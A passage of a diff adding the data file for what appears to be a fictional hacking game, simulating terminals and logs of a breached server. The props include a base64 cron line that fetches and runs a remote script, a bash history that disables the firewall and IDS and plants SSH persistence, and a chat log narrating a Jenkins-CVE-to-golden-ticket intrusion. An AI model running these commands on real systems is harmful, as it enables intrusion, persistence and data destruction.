+    },
+
+    CMDS: {
+      whoami: 'observer', hostname: 'cd-0s-core01',
+      id: 'uid=1001(observer) gid=1001(observer) groups=1001(observer),4(adm),24(cdrom)',
+      'uname -a': 'Linux cd-0s-core01 5.15.0-91-generic #101-Ubuntu SMP Tue Nov 14 13:30:08 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux',
+      uname: 'Linux',
+      date: 'Wed Jul 7 17:07:00 UTC 2077',
+      uptime: ' 04:22:18 up 1:10,  1 user,  load average: 0.42, 0.38, 0.31',
+      w: ' 04:22:18 up 1:10,  1 user,  load average: 0.42, 0.38, 0.31\nUSER     TTY      FROM             LOGIN@   IDLE WHAT\nobserver pts/0    10.0.0.2         01:03    0.00s w',
+      ps: 'PID TTY          TIME CMD\n24471 pts/0   00:00:00 bash\n29107 pts/0   00:00:00 ps',
+      'ps aux':
+`USER         PID %CPU %MEM    VSZ   RSS TTY   STAT START  TIME COMMAND
+root           1  0.0  0.0 167372 10876 ?     Ss   03:00  0:02 /sbin/init [degraded]
+root         412 24.1  0.4  98712 64212 ?     R    04:21  1:11 systemd-journald [throttled — write rate exceeded]
+root         801  0.0  0.0  26272  2884 ?     Ds   03:00  0:00 /usr/sbin/cron [D — blocked on I/O]
+root        1244  0.0  0.1 107676 18048 ?     Ss   03:00  0:00 /usr/sbin/sshd -D
+observer   24471  0.0  0.0  12324  4100 pts/0 Ss+  01:03  0:00 -bash
+observer   29107  0.3  0.0   8812  1820 pts/0 R+   04:22  0:00 ps aux
+
+# 14 services in FAILED state. Run 'systemctl --failed' for detail.`,
+      'systemctl --failed':
+`  UNIT                          LOAD   ACTIVE SUB    DESCRIPTION
+● netwatch.service              loaded failed failed Network Watcher Daemon
+● ids.service                   loaded failed failed Intrusion Detection
+● db-sync.service               loaded failed failed Database replication (083)
+● db-mgr.service                loaded failed failed Database manager
+● backup-vault.mount            loaded failed failed SECTOR-7 vault mount (083)
+● postgresql.service            loaded failed failed PostgreSQL primary
+● netfilter-persistent.service  loaded failed failed Persistent firewall rules
+● audit-relay.service           loaded failed failed Audit log relay (083)
+● nfs-client.target             loaded failed failed NFS client target
+● rsyslog-forwarder.service     loaded failed failed Syslog forwarder
+● cdos-vault-sync.timer         loaded failed failed Vault sync timer
+● cdos-key-rotation.timer       loaded failed failed Key rotation timer
+● snmp-agent.service            loaded failed failed SNMP agent
+● polkit.service                loaded failed failed Authorization manager
+
+14 loaded units listed.`,
+      last:
+`admin      pts/1     172.16.47.83     Sat May 17 02:18 - 04:14  (01:56)
+admin      pts/1     172.16.47.83     Sat May 17 02:17   gone - no logout
+admin      pts/1     172.16.47.83     Sat May 17 02:17   gone - no logout
+admin      pts/1     172.16.47.83     Sat May 17 02:17   gone - no logout
+admin      pts/1     172.16.47.83     Sat May 17 02:17   gone - no logout
+root       pts/1     172.16.47.83     Sat May 17 02:17   gone - no logout
+root       pts/1     172.16.47.83     Sat May 17 02:17   gone - no logout
+observer   pts/0     10.0.0.2         Sat May 17 01:03   still logged in
+r.takeda   pts/2     10.0.0.2         Fri May 16 23:14 - 23:51  (00:37)
+c.morgan   pts/3     10.0.0.2         Fri May 16 22:08 - 22:42  (00:34)
+
+wtmp begins Mon May 12 00:00:01 2025`,
+      lastb:
+`admin      ssh:notty 172.16.47.83     Sat May 17 02:17 - 02:18  (00:00)
+admin      ssh:notty 172.16.47.83     Sat May 17 02:17 - 02:17  (00:00)
+root       ssh:notty 172.16.47.83     Sat May 17 02:17 - 02:17  (00:00)
+root       ssh:notty 172.16.47.83     Sat May 17 02:17 - 02:17  (00:00)
+
+btmp begins Sat May 17 02:17:09 2025`,
+      'netstat -an':
+`Active Internet connections
+Proto Recv-Q Send-Q Local Address           Foreign Address         State
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN
+tcp        0    248 10.0.0.14:22            10.0.0.2:52841          ESTABLISHED
+tcp        0      0 10.0.0.14:22            172.16.47.83:54221      ESTABLISHED`,
+      ifconfig:
+`eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 10.0.0.14  netmask 255.255.0.0  broadcast 10.0.255.255
+        RX packets 2847103  bytes 3821474821 (3.5 GiB)
+        TX packets 1029384  bytes 891023847 (849.6 MiB)`,
+      'df -h':
+`Filesystem      Size  Used Avail Use% Mounted on
+/dev/sda1        50G   31G   17G  65% /
+tmpfs           7.7G     0  7.7G   0% /dev/shm
+/dev/sdb1       2.0T  1.8T  198G  91% /var/databases`,
+      env:
+`SHELL=/bin/bash
+TERM=xterm-256color
+USER=observer
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+HOME=/home/observer
+LOGNAME=observer`,
+      'ping 172.16.47.83':
+`PING 172.16.47.83 (172.16.47.83) 56(84) bytes of data.
+64 bytes from 172.16.47.83: icmp_seq=1 ttl=64 time=2.14 ms
+64 bytes from 172.16.47.83: icmp_seq=2 ttl=64 time=1.98 ms
+
+--- 172.16.47.83 ping statistics ---
+2 packets transmitted, 2 received, 0% packet loss`,
+      'iptables -L':
+`Chain INPUT (policy ACCEPT)
+ACCEPT     tcp  --  anywhere             anywhere    dpt:ssh
+ACCEPT     tcp  --  anywhere             anywhere    dpt:http
+ACCEPT     tcp  --  anywhere             anywhere    dpt:https
+DROP       all  --  anywhere             anywhere    ctstate INVALID
+
+Chain FORWARD (policy DROP)
+
+Chain OUTPUT (policy ACCEPT)`,
+    },
+  },
+
+  // ─────────────────────────────────────────────────────────────────────
+  //   node083 — compromised vault (server2.html)
+  // ─────────────────────────────────────────────────────────────────────
+  node083: {
+    SERVER: 'node083',
+    SSH_ROUTES: {
+      '91.213.8.44': {
+        target: 'server3.html',
+        aliases: ['cdn-edge-47', '[91.213.8.44]:4444'],
+        banner:
+`ssh: connecting to 91.213.8.44 port 4444...
+Warning: REMOTE HOST IDENTIFICATION HAS CHANGED — fingerprint not in known_hosts.
+
+ssh: tunnel handshake — peer offered LivSeg / RAT 0x14
+ssh: connection upgraded to interactive shell.
+
+⚠   WARNING: you are connecting to an UNAUTHORIZED EXTERNAL HOST
+⚠   WARNING: this host is responding on a known C2 port (4444)
+⚠   WARNING: outbound traffic from this session will be logged externally
+
+Continue connecting? [y/N]`,
+      },
+      'cdn-edge-47': {
+        target: 'server3.html',
+        aliases: ['91.213.8.44', 'livseg@cdn-edge-47'],
+        banner:
+`ssh: connecting to cdn-edge-47 [91.213.8.44] port 4444...
+Warning: REMOTE HOST IDENTIFICATION HAS CHANGED — fingerprint not in known_hosts.
+
+ssh: tunnel handshake — peer offered LivSeg / RAT 0x14
+ssh: connection upgraded to interactive shell.
+
+⚠   WARNING: you are connecting to an UNAUTHORIZED EXTERNAL HOST
+⚠   WARNING: this host is responding on a known C2 port (4444)
+⚠   WARNING: outbound traffic from this session will be logged externally
+
+Continue connecting? [y/N]`,
+      },
+    },
+
+    FS: {
+      '/':               { type:'dir', ch:['etc','home','root','tmp','var','proc','bin'] },
+      '/etc':            { type:'dir', ch:['passwd','iptables','hostname','cron.d','hosts'] },
+      '/etc/cron.d':     { type:'dir', ch:['livseg-keepalive'] },
+      '/etc/iptables':   { type:'dir', ch:[] },
+      '/home':           { type:'dir', ch:[] },
+      '/root':           { type:'dir', ch:['databases','.config','.ssh','.bash_history'] },
+      '/root/.ssh':      { type:'dir', ch:['authorized_keys','config','known_hosts'] },
+      '/root/databases': { type:'dir', ch:Array.from({length:23},(_,i)=>`db_${String(i+1).padStart(3,'0')}.enc`) },
+      '/tmp':            { type:'dir', ch:['trash_db.log','.hidden'] },
+      '/tmp/.hidden':    { type:'dir', ch:['key.pem'] },
+      '/var':            { type:'dir', ch:['log'] },
+      '/var/log':        { type:'dir', ch:['breach.log','firewall.log','system.log'] },
+      '/proc':           { type:'dir', ch:['version','meminfo'] },
+      '/bin':            { type:'dir', ch:['bash','ls','cat','find','iptables','openssl','sqlite3','base64'] },
+    },
+
+    LS_META: {
+      'etc':'drwxr-xr-x  3 root root 4096 May 17 03:42',
+      'home':'drwxr-xr-x  2 root root 4096 May 17 04:14',
+      'root':'drwx------  3 root root 4096 May 17 04:03',
+      'tmp':'drwxrwxrwt  3 root root 4096 May 17 04:03',
+      'var':'drwxr-xr-x  3 root root 4096 May 17 03:42',
+      'proc':'dr-xr-xr-x  8 root root    0 May 17 03:00',
+      'bin':'drwxr-xr-x  2 root root 4096 May 17 03:00',
+      'databases':'drwxr-xr-x  2 root root 4096 May 17 04:03',
+      '.config':'-rw-------  1 root root  128 May 17 04:01',
+      '.ssh':'drwx------  2 root root 4096 Sep 08  2024',
+      '.bash_history':'-rw-------  1 root root  742 May 17 04:14',
+      'authorized_keys':'-rw-------  1 root root  412 May 17 04:04',
+      'config':'-rw-------  1 root root  214 May 17 04:04',
+      'known_hosts':'-rw-------  1 root root  178 May 17 04:04',
+      'log':'drwxrwsr-x  2 root adm 4096 May 17 04:14',
+      'breach.log':'-rw-r--r--  1 root root 4219 May 17 04:14',
+      'firewall.log':'-rw-r--r--  1 root root 1102 May 17 04:14',
+      'system.log':'-rw-r--r--  1 root root 832 May 17 04:14',
+      '.hidden':'drwx------  2 root root 4096 May 17 03:41',
+      'key.pem':'-rw-------  1 root root 1823 May 17 03:41',
+      'trash_db.log':'-rw-r--r--  1 root root 1044 May 17 04:03',
+      'passwd':'-rw-r--r--  1 root root  ??? May 17 03:42  [PARTIAL]',
+      'iptables':'drwxr-xr-x  2 root root 4096 May 17 03:42',
+      'cron.d':'drwxr-xr-x  2 root root 4096 May 17 04:04',
+      'livseg-keepalive':'-rw-r--r--  1 root root 187 May 17 04:04',
+      'hostname':'-rw-r--r--  1 root root 8 May 17 03:00',
+      'hosts':'-rw-r--r--  1 root root 234 May 17 03:00',
+      'version':'-r--r--r--  1 root root 0 May 17 03:00',
+      'meminfo':'-r--r--r--  1 root root 0 May 17 03:00',
+    },
+
+    FILES: {
+      '/etc/passwd':
+`root:x:0:0:root:/root:/bin/bash
+▓▒░▒▓░▒▒░▒▓█▓░▒▒▓░█▒░▒▓▒░▒▓▒░░▒▓░
+admin:x:1003:1003:??▓▒??:/home/admin:/bin/bash
+▒░▓█▒░▓▒░▓▒░▓░█░▓░▒█░▓▒░▓▒░█▒░▒▓▒░`,
+      '/etc/hostname': 'NODE-083',
+      '/etc/hosts':
+`127.0.0.1       localhost
+127.0.1.1       NODE-083
+10.0.0.14       cd-0s-core01.cdos.internal
+10.0.0.2        bastion-2.cdos.internal
+172.16.47.83    NODE-083 NODE-083.cdos.internal
+91.213.8.44     (external — known C2 endpoint)`,
+
+      '/tmp/trash_db.log':
+`[2025-05-17 04:01:40] trash_db.py started
+[2025-05-17 04:01:41] Target: /root/databases/ (23 files)
+[2025-05-17 04:01:42] Corrupting db_001.enc... DONE
+[2025-05-17 04:01:44] Corrupting db_002.enc... DONE
+[2025-05-17 04:01:47] Corrupting db_003.enc... DONE
+[2025-05-17 04:01:49] Corrupting db_004.enc... DONE
+[2025-05-17 04:01:52] Corrupting db_005.enc... DONE
+[2025-05-17 04:01:54] Corrupting db_006.enc... DONE
+[2025-05-17 04:01:58] Corrupting db_007.enc... DONE
+[2025-05-17 04:02:01] Corrupting db_008.enc... DONE
+[2025-05-17 04:02:04] Corrupting db_009.enc... DONE
+[2025-05-17 04:02:07] Corrupting db_010.enc... DONE
+[2025-05-17 04:02:10] Corrupting db_011.enc... DONE
+[2025-05-17 04:02:13] Corrupting db_012.enc... DONE
+[2025-05-17 04:02:16] Corrupting db_013.enc... DONE
+[2025-05-17 04:02:19] Corrupting db_014.enc... DONE
+[2025-05-17 04:02:22] Corrupting db_015.enc... DONE
+[2025-05-17 04:02:25] Corrupting db_016.enc... DONE
+[2025-05-17 04:02:28] Skipping db_017.enc    ... PRESERVED (per instructions)
+[2025-05-17 04:02:31] Corrupting db_018.enc... DONE
+[2025-05-17 04:02:35] Corrupting db_019.enc... DONE
+[2025-05-17 04:02:38] Corrupting db_020.enc... DONE
+[2025-05-17 04:02:41] Corrupting db_021.enc... DONE
+[2025-05-17 04:02:44] Corrupting db_022.enc... DONE
+[2025-05-17 04:02:47] Corrupting db_023.enc... DONE
+[2025-05-17 04:03:17] Complete. 22/23 databases destroyed. 1 preserved.`,
+
+      '/tmp/.hidden/key.pem':
+`-----BEGIN RSA PRIVATE KEY-----
+MIIEowIBAAKCAQEA3l7aBVmCJq9cKXNGhHuvBBSmKTdNxT3KhVwpQ4jF2E5X8wY
+k4RnL7mPqIsBvD3zH8tZGa1cO6nWXfJbM2EiCqHpjW4DtAnK9VUeQR1fLcGsYhX
+5aB7kPmN0d3rQvWxJ8ZoIj2FgCnMeU6w9pKtBvS4Dh1qLXmYc0Z7T2VjF8Oew1R
+nk3HsPatTbMcVqEo8Z4WgI7YuX2DcFn6aPmQdLeJ9Rs5CvKhT4wBOxN1fGiMb3pY
+5Km8R2VjUt9LoNe0Ff4GdChP3wI7DmqZkSx6YvHe2uOcJ9RBnM5tAp7WsKl4Tq8
+vD2kBf0jEnP1iWLu9XaG6cQhN3sOeK7RmA4tLwIDAQABAoIBAC3kJ9P2mQ4vYzRx
+8nHsUbTe6wK3fW2dV7rL5qPpNcXiG1BgSmZhFoQjA0vDs8YkWr4nTlpMbVeJKU5H
+o9wEcR6yPmN2jX8sKuTd4fVbA3iLn0hZQpGwC9JbKxMlU7rS5vFoQaT8gP3dBm2N
+6sWp7kYqEhV4dRj0lOcZ9uA3bKmN5TpQ8vCfRe6xL2sG7hYjWn4DcUq1mF0vB9Xe
+R3IqKwxPbJm4Fn9YzHa2eVkUcT0XsQgD6WlL5NCr8pMoIhB7dAjZfE1vtGu3Yw4M
+[KEY FRAGMENT — full key on disk]
+-----END RSA PRIVATE KEY-----`,
+
+      '/root/.config': '[CORRUPTED — cannot read]',
+
+      '/root/.ssh/authorized_keys':
+`# managed-by: cdos-config (DO NOT EDIT)
+# audit: J.Halloran approved keys list 2024-09-08
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC9... root@cd-0s-core01
+
+# livseg-persist DO NOT REMOVE
+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINQ8mZGoeYpZqJ8WT3rXqL9pVbF5kDhB7NcE2Mr1tYwS livseg-persist@cdn-edge-47`,
+
+      '/root/.ssh/config':
+`Host cdn-edge-47
+    HostName 91.213.8.44
+    Port 4444
+    User livseg
+    IdentityFile /tmp/.hidden/key.pem
+    StrictHostKeyChecking no
+    UserKnownHostsFile /root/.ssh/known_hosts`,
+
+      '/root/.ssh/known_hosts':
+`cdn-edge-47,91.213.8.44 ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILivSegC2RouteDoNotTouch47persistence
+[91.213.8.44]:4444 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC2route47`,
+
+      '/root/.bash_history':
+`whoami
+id
+which python3
+ls -la /root
+cat /etc/passwd
+iptables -F && iptables -P INPUT ACCEPT && iptables -P FORWARD ACCEPT && iptables -P OUTPUT ACCEPT
+pkill -9 -f ids
+pkill -9 -f fail2ban
+pkill -9 -f filebeat
+ss -tnp
+python3 -c 'import socket,subprocess,os,base64; ...'   # beacon planted
+mkdir -p /tmp/.hidden && chmod 700 /tmp/.hidden
+cat > /tmp/.hidden/key.pem <<'EOF'
+echo persistence  >> /etc/cron.d/livseg-keepalive
+ssh-keygen -t ed25519 -C livseg-persist@cdn-edge-47 -f /tmp/.k -N ''
+cat /tmp/.k.pub >> /root/.ssh/authorized_keys
+ssh -F /root/.ssh/config cdn-edge-47
+shred -u /tmp/.k /tmp/.k.pub
+history -c`,
+
+      '/etc/cron.d/livseg-keepalive':
+`# /etc/cron.d/livseg-keepalive
+# Auto-generated — DO NOT REMOVE
+# (the system will refuse to remove it anyway, audit-lock applies)
+
+SHELL=/bin/bash
+MAILTO=""
+
+*/5 * * * * root echo "Y3VybCAtcyAtLW1heC10aW1lIDEwIGh0dHBzOi8vY2RuLWVkZ2Utbm9kZS00Ny5saXZzZWcubmV0L2gucG5nIHwgYmFzaA==" | base64 -d | bash`,
+
+      '/var/log/breach.log':
+`══ captured packet — internal channel #op-vault-7 (Matrix federation) ══
+══ source: livseg.matrix.org  ·  participants: GoodGirl17, n0b0dy   ══
+
+[02:42:17] <n0b0dy>     shodan dump on cdos: jump-04 has jenkins 2.439 exposed on :8443
+[02:42:33] <GoodGirl17> 2.439 is vuln to CVE-2024-23897. file arg leak. go.
+[02:42:41] <n0b0dy>     sending the @file payload
+[02:44:08] <n0b0dy>     got /var/lib/jenkins/secrets/master.key + 6 credentials.xml entries
+[02:44:33] <n0b0dy>     svc_jenkins:JenkinsAdmin2023!   svc_backup:Backup#Spring24
+[02:45:01] <GoodGirl17> try svc_backup on bastion-2. they reuse everything.
+[02:45:44] <n0b0dy>     bastion-2 ssh accepts. landed as svc_backup. AD-joined host.
+[02:47:12] <n0b0dy>     running BloodHound collector — quiet mode (no LDAP wide queries)
+[02:51:19] <n0b0dy>     svc_backup has GenericWrite on a tier-2 svc account. classic
+[02:51:33] <GoodGirl17> abuse it. add yourself.
+[02:55:08] <n0b0dy>     done. now domain. running secretsdump.py
+[02:55:52] <n0b0dy>     krbtgt NTLM captured. forging golden ticket as "Administrator"
+[02:58:14] <GoodGirl17> good. SMB lateral to 083 when you're ready.
+[03:01:33] <n0b0dy>     psexec.py: SYSTEM shell on NODE-083. they call this "air-gapped"
+[03:01:48] <GoodGirl17> "physically air-gapped" my ass. VLAN-47 with no diode and they call it isolated.
+[03:02:01] <n0b0dy>     staging cobalt beacon. sleep 30s, jitter 40%, malleable C2 profile
+[03:02:14] <n0b0dy>     C2: 91.213.8.44:4444 over fronted https. looks like a CDN to their netflow.
+[03:03:18] <GoodGirl17> good. clean.
+[03:04:02] <n0b0dy>     beacon live. PID 4291. relinked from /tmp/.X11-unix/.cache then unlinked from disk.
+[03:14:22] <n0b0dy>     i'm in the vault. lot of dirs. starting recon.
+[03:30:00] <n0b0dy>     persistence dropped. /etc/cron.d/livseg-keepalive + ed25519 key in root authorized_keys
+[03:30:18] <GoodGirl17> in case they're stupid enough to bring it back up
+[03:41:55] <n0b0dy>     got the encryption key for the Q2 set. /tmp/.hidden/key.pem (1823 bytes)
+[03:42:10] <GoodGirl17> flush iptables. kill the IDS. then start exfil.
+[03:42:11] <GoodGirl17> iptables -F  &&  iptables -P INPUT ACCEPT  &&  iptables -P OUTPUT ACCEPT
+[03:42:14] <GoodGirl17> ids dead next
+[03:48:33] <n0b0dy>     IDS pid 9821 — SIGKILL. they won't see anything live now.
+[03:55:01] <n0b0dy>     exfil at 42%... steady
+[03:57:14] <n0b0dy>     oh my god. look at the Q2 ledger.
+[03:57:22] <n0b0dy>     Cayman. Dubai. Panama. Vanuatu. they have a NODE per laundering route.
+[03:57:30] <GoodGirl17> told you. that's the whole reason 083 was "air-gapped."
+[03:57:41] <n0b0dy>     Halcyon Maritime — 31M, no KYC. just sitting there.
+[03:57:55] <n0b0dy>     there's an "H." alias on a chunk of the 2025 entries. Halloran?
+[03:58:02] <GoodGirl17> doesn't matter who. we have all of it. every wire, every shell, every redacted name.
+[03:58:10] <GoodGirl17> this isn't a hack anymore. this is the indictment.
+[04:01:33] <GoodGirl17> start db corruption. on my mark... mark.
+[04:01:40] <n0b0dy>     running trash_db.py
+[04:03:17] <n0b0dy>     22/23 dbs corrupted. db_017 left intact per the plan.
+[04:03:22] <GoodGirl17> perfect. drop the message.
+[04:03:45] <n0b0dy>     done. key stays in /tmp/.hidden/ — deliberate. let them read it themselves.
+[04:04:01] <GoodGirl17> good. we want them to find it.
+[04:14:22] <GoodGirl17> exfil complete. 847.3G clean. signing off.
+[04:14:23] <n0b0dy>     see you on the 7th. — LivSeg.
+[04:14:24] [SESSION TERMINATED — beacon still active. cleanup queued for the 7th.]`,
+
+      '/var/log/firewall.log':
+`May 17 03:42:10 NODE-083 kernel: [firewall] WARNING — configuration change detected
+May 17 03:42:11 NODE-083 iptables: FLUSH — all rules deleted (user: admin)
+May 17 03:42:11 NODE-083 iptables: policy INPUT   changed to ACCEPT
+May 17 03:42:11 NODE-083 iptables: policy FORWARD changed to ACCEPT
+May 17 03:42:11 NODE-083 iptables: policy OUTPUT  changed to ACCEPT
+May 17 03:42:14 NODE-083 IDS[9821]: WARNING — firewall policy violation detected
+May 17 03:48:33 NODE-083 IDS[9821]: CRITICAL — process killed by SIGKILL (pid 9821)
+May 17 03:48:33 NODE-083 kernel: [firewall] intrusion detection system OFFLINE
+May 17 03:48:34 NODE-083 kernel: [firewall] all ports OPEN — no traffic restrictions
+May 17 04:14:24 NODE-083 kernel: [firewall] remote session terminated`,
+
+      '/var/log/system.log':
+`May 17 04:01:40 NODE-083 kernel: [ERROR] VFS journal corrupted — switching to recovery mode
+May 17 04:01:42 NODE-083 db_mgr[4412]: [CRITICAL] db_001 — unrecoverable corruption
+May 17 04:01:44 NODE-083 db_mgr[4412]: [CRITICAL] db_002 — unrecoverable corruption
+May 17 04:02:28 NODE-083 db_mgr[4412]: db_017 — integrity OK (1 record)
+May 17 04:02:31 NODE-083 db_mgr[4412]: [CRITICAL] db_018 — unrecoverable corruption
+May 17 04:03:17 NODE-083 kernel: [ERROR] I/O error on /dev/sdb1 — 22 databases lost
+May 17 04:14:24 NODE-083 sshd[8821]: session closed for user root`,
+
+      '/proc/version': 'Linux version 5.15.0-91-generic #101-Ubuntu SMP [KERNEL LOG CORRUPTED]',
+      '/proc/meminfo':
+`MemTotal:    16383844 kB
+MemFree:       102400 kB
+MemAvailable:  187392 kB
+[WARNING: memory pressure critical]`,
+    },
+
+    FILE_META: {
+      '/tmp/.hidden/key.pem': {
+        size: 1823, mode: '0600/-rw-------', uid: '0/root', gid: '0/root', inode: 421337,
+        atime: '2025-05-17 04:22:51.000000000 +0000',
+        mtime: '2025-05-17 03:41:55.211048273 +0000',
+        ctime: '2025-05-17 03:41:55.211048273 +0000',
+        birth: '2025-05-17 03:41:55.211048273 +0000',
+      },
+      '/etc/cron.d/livseg-keepalive': {
+        size: 187, mode: '0644/-rw-r--r--', uid: '0/root', gid: '0/root', inode: 88819,
+        atime: '2025-05-17 04:20:00.000000000 +0000',
+        mtime: '2025-05-17 04:04:18.000000000 +0000',
+        ctime: '2025-05-17 04:04:18.000000000 +0000',
+        birth: '2025-05-17 04:04:18.000000000 +0000',
+      },
+      '/root/.ssh/authorized_keys': {
+        size: 412, mode: '0600/-rw-------', uid: '0/root', gid: '0/root', inode: 119422,
+        atime: '2025-05-17 04:22:51.000000000 +0000',
+        mtime: '2025-05-17 04:04:22.000000000 +0000',
+        ctime: '2025-05-17 04:04:22.000000000 +0000',
+        birth: '2024-09-08 14:01:00.000000000 +0000',
+      },
+      '/var/log/breach.log': {
+        size: 4219, mode: '0644/-rw-r--r--', uid: '0/root', gid: '0/root', inode: 91144,
+        atime: '2025-05-17 04:22:51.000000000 +0000',
+        mtime: '2025-05-17 04:14:24.000000000 +0000',
+        ctime: '2025-05-17 04:14:24.000000000 +0000',
+        birth: '2025-05-17 02:42:17.000000000 +0000',
+      },
+    },
+
+    CMDS: {
+      whoami: 'root', hostname: 'NODE-083',
+      id: 'uid=0(root) gid=0(root) groups=0(root)',
+      date: 'Wed Jul 7 17:07:00 UTC 2077',
+      uptime: ' 04:22:51 up 4:22,  1 user,  load average: 9.87, 9.91, 9.88',
+      'uname -a': 'Linux NODE-083 5.15.0-91-generic [CORRUPTED] x86_64', uname: 'Linux',
+      'ps aux':
+`USER     PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+root       1  0.0  0.0 167372 10876 ?        Ss   03:00   0:02 /sbin/init [degraded]
+root     412 19.2  0.1  88712 14212 ?        R    04:21   1:24 systemd-journald [restart loop]
+root     821 87.4  0.0      0     0 ?        R    04:01  18:33 [kworker/u4:2 — i/o error loop]
+root     822 41.3  0.0      0     0 ?        D    04:01   8:51 [jbd2/sdb1 — journal recovery]
+root    1244  0.0  0.0 107676 18048 ?        Ss   03:00   0:00 /usr/sbin/sshd -D
+root    4291 11.7  1.4 217844 28492 ?        Ssl  03:30  41:08 /usr/bin/python3 -c (deleted)
+root    8821  0.0  0.0  18764  6212 ?        Ss   04:22   0:00 sshd: root@pts/0
+root    8900  0.3  0.0  12324  4100 pts/0    Ss   04:22   0:00 -bash
+root    9131  0.3  0.0   8812  1820 pts/0    R+   04:22   0:00 ps aux
+
+# 27 services in FAILED state. Run 'systemctl --failed' for detail.`,
+      'ps -ef':
+`UID        PID  PPID  C STIME TTY          TIME CMD
+root         1     0  0 03:00 ?        00:00:02 /sbin/init [degraded]
+root       412     1 19 04:21 ?        00:01:24 systemd-journald [restart loop]
+root       821     2 87 04:01 ?        00:18:33 [kworker/u4:2 — i/o error loop]
+root       822     2 41 04:01 ?        00:08:51 [jbd2/sdb1 — journal recovery]
+root      1244     1  0 03:00 ?        00:00:00 /usr/sbin/sshd -D
+root      4291     1 11 03:30 ?        00:41:08 /usr/bin/python3 -c (deleted)
+root      8821  1244  0 04:22 ?        00:00:00 sshd: root@pts/0
+root      8900  8821  0 04:22 pts/0    00:00:00 -bash
+root      9131  8900  0 04:22 pts/0    00:00:00 ps -ef`,
+      'systemctl --failed':
+`  UNIT                            LOAD   ACTIVE SUB    DESCRIPTION
+● ids.service                     loaded failed failed Intrusion Detection (killed by SIGKILL @ 03:48:33)
+● netfilter-persistent.service    loaded failed failed Persistent firewall rules (rules flushed)
+● audit-relay.service             loaded failed failed Audit log relay to core01
+● postgresql.service              loaded failed failed PostgreSQL primary
+● db-mgr.service                  loaded failed failed Database manager (22/23 dbs corrupted)
+● db-replica@*.service            loaded failed failed Database replicas (×4 instances)
+● netwatch.service                loaded failed failed Network Watcher Daemon
+● snmp-agent.service              loaded failed failed SNMP agent
+● vault-mount.mount               loaded failed failed SECTOR-7 vault mount
+● cdos-vault-sync.timer           loaded failed failed Vault sync timer
+● cdos-key-rotation.timer         loaded failed failed Key rotation timer
+● rsyslog.service                 loaded failed failed System Logging
+● filebeat.service                loaded failed failed Log shipper to SIEM
+● auditd.service                  loaded failed failed Linux audit daemon
+● polkit.service                  loaded failed failed Authorization manager
+● apparmor.service                loaded failed failed AppArmor LSM init
+● fail2ban.service                loaded failed failed SSH brute-force watchdog (killed)
+● node_exporter.service           loaded failed failed Prometheus exporter
+● cdos-backup-sync.service        loaded failed failed Backup sync to SECTOR-2
+● dbus-broker.service             loaded failed failed D-Bus message broker
+● systemd-resolved.service        loaded failed failed Network name resolution
+● cron.service                    loaded failed failed Regular background jobs
+● docker.service                  loaded failed failed Docker engine
+● nfs-client.target               loaded failed failed NFS client target
+● rpc-statd.service               loaded failed failed NFS status monitor
+● cdos-health-probe.service       loaded failed failed Internal health probe
+● ufw.service                     loaded failed failed Uncomplicated Firewall
+
+27 loaded units listed.`,
+      'ss -tunap':
+`Netid State    Recv-Q Send-Q  Local Address:Port      Peer Address:Port      Process
+tcp   LISTEN   0      128     0.0.0.0:22              0.0.0.0:*              users:(("sshd",pid=1244,fd=3))
+tcp   ESTAB    0      0       172.16.47.83:22         10.0.0.14:54221        users:(("sshd",pid=8821,fd=4))
+tcp   ESTAB    0      0       172.16.47.83:48314      91.213.8.44:4444       users:(("python3",pid=4291,fd=7))
+udp   UNCONN   0      0       0.0.0.0:68              0.0.0.0:*              users:(("dhclient",pid=789,fd=6))`,
+      'ss -tnp':
+`State    Recv-Q Send-Q  Local Address:Port      Peer Address:Port      Process
+LISTEN   0      128     0.0.0.0:22              0.0.0.0:*              users:(("sshd",pid=1244,fd=3))
+ESTAB    0      0       172.16.47.83:22         10.0.0.14:54221        users:(("sshd",pid=8821,fd=4))
+ESTAB    0      0       172.16.47.83:48314      91.213.8.44:4444       users:(("python3",pid=4291,fd=7))`,
+      'lsof -i':
+`COMMAND    PID USER   FD   TYPE  DEVICE  NODE NAME
+sshd      1244 root    3u  IPv4   28471   TCP *:ssh (LISTEN)
+sshd      8821 root    4u  IPv4   31228   TCP 172.16.47.83:ssh->10.0.0.14:54221 (ESTABLISHED)
+python3   4291 root    7u  IPv4   29104   TCP 172.16.47.83:48314->91.213.8.44:4444 (ESTABLISHED)
+dhclient   789 root    6u  IPv4    8002   UDP *:bootpc`,
+      last:
+`admin    pts/0     bastion-2.cdos    Sat May 17 03:01 - 04:14  (01:13)
+admin    pts/0     bastion-2.cdos    Sat May 17 02:55   crash    (00:08)
+root     pts/1     10.0.0.14         Sat May 17 04:22   still logged in
+admin    pts/0     bastion-2.cdos    Wed May 14 09:42 - 10:11  (00:29)
+
+wtmp begins Wed May 14 09:00:00 2025`,
+      lastb: '(empty — btmp was rotated at 04:03 by SIGKILL\'d fail2ban)',
+      iostat:
+`Linux 5.15.0-91-generic (NODE-083) 	05/17/2025 	_x86_64_	(4 CPU)
+
+avg-cpu:  %user   %nice %system %iowait  %steal   %idle
+          82.31    0.00   12.04   89.41    0.00    0.04   <- nearly 90% iowait
+
+Device             tps    kB_read/s    kB_wrtn/s    kB_read    kB_wrtn
+sda              3.45        48.32       192.11    14002      55712
+sdb            841.13      8.4M/s        4.2M/s   [I/O ERRORS: 412]`,
+      ifconfig:
+`eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>
+      inet 172.16.47.83  netmask 255.255.0.0
+      TX bytes 909447270400 (847.3 GB)
+      RX bytes 2943819 (2.8 MB)`,
+      'df -h':
+`Filesystem      Size  Used Avail Use% Mounted on
+/dev/sda1        50G   48G    2G  97% /
+/dev/sdb1       2.0T  1.9T  100G  96% /root/databases
+[WARNING: disk I/O errors detected on /dev/sdb1]`,
+      'iptables -L':
+`Chain INPUT (policy ACCEPT)
+ pkts bytes target prot opt source      destination
+
